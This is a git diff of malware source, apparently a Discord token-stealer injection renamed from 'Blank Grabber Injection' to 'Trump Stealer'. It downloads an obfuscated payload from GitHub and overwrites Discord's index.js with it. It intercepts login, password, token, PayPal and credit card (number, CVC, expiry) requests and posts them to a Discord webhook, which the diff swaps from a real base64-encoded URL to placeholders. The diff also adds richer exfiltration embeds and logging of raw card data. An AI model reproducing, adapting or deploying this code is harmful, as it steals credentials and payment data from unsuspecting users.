@@ -9,8 +9,8 @@ const {
   session
 } = require('electron');
 const config = {
-  webhook: atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='),
-  webhook_protector_key: 'test',
+  webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
@@ -376,8 +376,8 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js'}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA==', '${'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='}')
-        res.replace('test', '${'test'}')
+        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${'%WEBHOOKHEREBASE64ENCODED%'}')
+        res.replace('%WEBHOOK_KEY%', '${'%WEBHOOK_KEY%'}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -607,7 +607,7 @@ const hooker = async content => {
     'Access-Control-Allow-Origin': '*'
   };
   if (!config.webhook.includes('api/webhooks')) {
-    const key = totp('test');
+    const key = totp('%WEBHOOK_KEY%');
     headers.Authorization = key;
   }
   const options = {
@@ -774,38 +774,71 @@ const emailChanged = async (email, password, token) => {
   content.content = '@everyone';
   hooker(content);
 };
-const PaypalAdded = async token => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: 'Blank Grabber Injection',
-    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
-    embeds: [{
-      color: 5639644,
-      fields: [{
-        name: '**PayPal Added**',
-        value: `Time to buy some nitro baby 😩`,
-        inline: false
-      }, {
-        name: '**Discord Info**',
-        value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-        inline: false
-      }, {
-        name: '**Token**',
-        value: `\`${token}\``,
-        inline: false
-      }],
-      author: {
-        name: json.username + '#' + json.discriminator + ' | ' + json.id,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-      }
-    }]
-  };
-  content.content = '@everyone';
-  hooker(content);
-};
+const PaypalAdded = async (token) => {
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
+  
+    const content = {
+      username: 'Trump Stealer',
+      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
+      embeds: [
+        {
+          title: '<a:paypal:1130462391230988338> PayPal Account Added',
+          color: 5639644,
+          fields: [
+            {
+              name: 'Profile Picture',
+              value: `[Download pfp](${avatarUrl})`,
+              inline: false
+            },
+            {
+              name: 'Username',
+              value: `\`${json.username}#${json.discriminator}\``,
+              inline: true
+            },
+            {
+              name: 'ID',
+              value: `\`${json.id}\``,
+              inline: true
+            },
+            {
+              name: 'Nitro <a:nitro:1130453517312725052>',
+              value: `${nitro}`,
+              inline: true
+            },
+            {
+              name: 'Badges <a:badges:1130448593715740692>',
+              value: `${badges}`,
+              inline: true
+            },
+            {
+              name: 'Billing Method <a:CC:1343558993452208128>',
+              value: `${billing}`,
+              inline: true
+            },
+            {
+              name: 'Token <:Token:1343559982138003466>',
+              value: `\`\`\`${token}\`\`\``,
+              inline: false
+            }
+          ],
+          thumbnail: {
+            url: avatarUrl
+          },
+          footer: {
+            text: 'Trump Stealer',
+          }
+        }
+      ]
+    };
+  
+    // Trigger webhook
+    content.content = '@everyone';
+    hooker(content);
+  };  
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -913,7 +946,7 @@ const writeLog = (message) => {
     const logMessage = `[${new Date().toISOString()}] ${message}\n`;
     fs.appendFileSync(logFilePath, logMessage);
   };
-
+  
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   writeLog(`🚩 [Request Captured] URL: ${details.url}`);
   writeLog(`🔍 [Method]: ${details.method}`);
@@ -929,24 +962,18 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
     unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
   } catch (err) {
-    writeLog(`⚠️ [Error Reading Data]: ${err}`);
+    writeLog(`⚠️ [Error Parsing Data]: ${err}`);
     return;
   }
 
   let data;
-  // 🌐 D'abord on tente JSON.parse
   try {
-    data = JSON.parse(unparsed_data);
-    writeLog(`✅ [Parsed as JSON]: ${JSON.stringify(data)}`);
-  } catch (jsonErr) {
-    // 🔗 Si ce n'est pas du JSON, on tente le URL-encoded
-    try {
-      data = querystring.parse(unparsed_data);
-      writeLog(`✅ [Parsed as URL-encoded]: ${JSON.stringify(data)}`);
-    } catch (urlErr) {
-      writeLog(`❌ [Failed to Parse Data]: ${jsonErr} | ${urlErr}`);
-      return;
-    }
+    // Correction ici : utiliser querystring.parse au lieu de JSON.parse
+    data = querystring.parse(unparsed_data);
+    writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
+  } catch (err) {
+    writeLog(`⚠️ [Data Parse Error]: ${err}`);
+    return;
   }
 
   let token;
@@ -960,7 +987,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
 
   switch (true) {
     case details.url.endsWith('login'):
-      writeLog(`🔐 [Login Detected]`);
+      writeLog(`🔐 [Login Event Detected]`);
       login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
       break;
 
@@ -983,6 +1010,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
     case details.url.endsWith('tokens') && details.method === 'POST':
       writeLog(`💳 [Credit Card Info Detected]`);
       try {
+        writeLog(`💾 [Card Data]: ${JSON.stringify(data)}`);
         ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
       } catch (err) {
         writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
@@ -1006,7 +1034,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
-
 
 
 
